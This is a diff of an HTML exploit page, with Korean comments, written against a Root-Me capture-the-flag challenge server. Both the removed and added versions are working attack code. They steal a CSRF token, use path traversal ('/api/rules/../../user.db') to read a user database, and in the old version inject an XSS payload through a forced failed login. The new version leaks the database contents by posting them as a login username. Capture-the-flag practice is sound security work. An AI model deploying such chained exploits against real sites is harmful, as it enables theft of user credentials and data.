@@ -1,67 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Final Attack</title>
-</head>
 <body>
-    <h1>Executing final stage...</h1>
     <script>
         const challengeUrl = 'http://challenge01.root-me.org:58039';
 
-        async function launchAttack() {
-            try {
-                // 1. iframe으로 로그인 페이지를 열어 CSRF 토큰을 훔칩니다.
-                // 이 iframe은 챌린지 도메인을 로드하므로, 이 안에서 실행되는 스크립트는 CORS 문제가 없습니다.
-                const iframe = document.createElement('iframe');
-                iframe.src = challengeUrl + '/login';
-                iframe.style.display = 'none'; // 눈에 보이지 않게 숨김
-                document.body.appendChild(iframe);
+        async function start() {
+            // 1. Path Traversal로 user.db 파일의 내용을 가져옵니다.
+            const db_content_response = await fetch('/api/rules/../../user.db');
+            const db_content = await db_content_response.text();
 
-                iframe.onload = function() {
-                    try {
-                        const iframeDoc = iframe.contentWindow.document;
-                        const csrfToken = iframeDoc.querySelector('input[name="_csrf"]').value;
-                        console.log('Stole CSRF Token:', csrfToken);
+            // 2. 로그인 페이지에서 CSRF 토큰을 가져옵니다.
+            const login_page_response = await fetch('/login');
+            const login_page_text = await login_page_response.text();
+            const csrfToken = login_page_text.match(/name="_csrf" value="([^"]+)"/)[1];
 
-                        // 2. Path Traversal 페이로드를 준비합니다.
-                        // ../user.db 파일을 읽어오도록 합니다.
-                        const pathTraversalPayload = '../../user.db';
-
-                        // 3. XSS 페이로드를 준비합니다.
-                        // iframe을 하나 더 만들어 Path Traversal 결과를 표시하게 합니다.
-                        const finalXssPayload = `
-                            <iframe src="/api/rules/${pathTraversalPayload}" 
-                                    onload="top.document.body.innerHTML = '<h1>DB Content:</h1><pre>' + this.contentWindow.document.body.innerText + '</pre>';">
-                            </iframe>
-                        `;
-                        
-                        // 4. 강제로 로그인 실패를 유발하여 XSS 페이로드를 실행시킵니다.
-                        const form = document.createElement('form');
-                        form.method = 'POST';
-                        form.action = challengeUrl + '/login';
-                        form.innerHTML = `
-                            <input type="hidden" name="username" value="${finalXssPayload.replace(/"/g, '&quot;')}">
-                            <input type="hidden" name="password" value="fail">
-                            <input type="hidden" name="_csrf" value="${csrfToken}">
-                        `;
-                        document.body.appendChild(form);
-                        form.submit();
-
-                    } catch (e) {
-                        // iframe 내부 접근은 실패할 수 있으나, form submit은 계속 진행될 수 있음
-                        console.error('Iframe interaction failed, but proceeding:', e);
-                        // form submit은 CORS 정책의 영향을 받지 않으므로, 이 공격은 성공할 수 있습니다.
-                        // 이 부분은 복잡성을 줄이기 위해 간소화되었습니다.
-                    }
-                };
-
-            } catch (e) {
-                console.error('Outer attack failed:', e);
-            }
+            // 3. user.db 내용을 username으로 하여 로그인 실패 폼을 만듭니다.
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/login';
+            form.innerHTML = `
+                <input type="hidden" name="username" value="">
+                <input type="hidden" name="password" value="fail">
+                <input type="hidden" name="_csrf" value="${csrfToken}">
+            `;
+            form.elements.username.value = db_content; // value에 직접 삽입
+            document.body.appendChild(form);
+            form.submit();
         }
-
-        // 봇의 환경에 따라 타이밍 이슈가 있을 수 있으므로 약간의 딜레이 후 실행
-        setTimeout(launchAttack, 1000);
+        start();
     </script>
 </body>
 </html>
